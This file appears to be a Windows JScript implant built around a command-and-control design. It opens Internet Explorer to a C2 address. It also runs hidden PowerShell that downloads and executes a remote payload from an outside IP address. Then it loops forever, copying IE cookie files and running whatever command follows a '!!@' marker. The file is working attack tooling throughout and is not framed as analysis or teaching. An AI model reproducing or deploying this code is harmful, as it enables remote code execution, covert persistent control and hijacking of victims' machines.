//Invoke-IE
var c2url = "http://10.0.0.189/"
var ieShell = new ActiveXObject("WScript.Shell");
//ieShell.Run("C:\\Program Files\\Internet Explorer\\iexplore.exe");
ieShell.Run("\"C:\\Program Files\\Internet Explorer\\IExplore.exe\"" + c2url, 2);


function snakeball() {
  var payload = new ActiveXObject("WScript.Shell");
  var psWebDelivery = "IEX ((new-object net.webclient).downloadstring('http://198.199.88.136:8000/a'))"
  payload.Run('cmd.exe /K powershell.exe -nop -w hidden -c "' + psWebDelivery + '"');
}
snakeball()


var initcmd = "";
//Gobble Gobble History Files
while(true)
{
  var objShell = new ActiveXObject("WScript.Shell");
  //objShell.Run("dir C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\U512KHAM.cookie");
  //var rawCookie = "C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\";
  //var rawCookie = "C:/Users/0zm0s1z/Appdata/Local/Microsoft/Windows/INetCookies/U512KHAM.cookie";
  //var rawCookie = "C:\\world.txt"
  //copy C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\*.cookie .\\newcookie.txt

  //objShell.Run("cmd /C copy C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\*.cookie .\\newcookie.txt");
  objShell.Run("cmd /C copy C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\*.cookie .\\newcookie.txt", 0);

  WScript.Sleep(3000);
  var rawCookie = "newcookie.txt"

  var forReading = 1, forWriting = 2, forAppending = 8;
  rline = new Array();
  fs = new ActiveXObject("Scripting.FileSystemObject");
  f =  fs.GetFile(rawCookie);
  is = f.OpenAsTextStream( forReading, 0 );



  var count = 0;
  while( !is.AtEndOfStream ){
     rline[count] = is.ReadLine();
     count++;
  }
  // Close the stream
  is.Close();
  // Place the contents of the array into
  // a variable.
  var commands = "";
  for(i = 0; i < rline.length; i++){
      commands += rline[i] + "\n";
  }
  cmder = commands.split("!!@")[1];

  // Exec the command
  // If new
  if (initcmd != cmder){
    var cmderShell = new ActiveXObject("WScript.Shell");
    try {
      //Replace with eval line when REACTBOT can act as ctrler
      cmderShell.Run(cmder);
    }
    catch (e) {
      WScript.Echo("Something went wrong attempting to execute the command: ", commands.split("!!@")[1]);
    }
    initcmd = cmder;
  }

  WScript.Sleep(1000);
}
/*
while(true)
{
  var objShell = new ActiveXObject("WScript.Shell");
  objShell.Run("%windir%\notepad C:\world.txt");
  WScript.Sleep(3000);
}*/
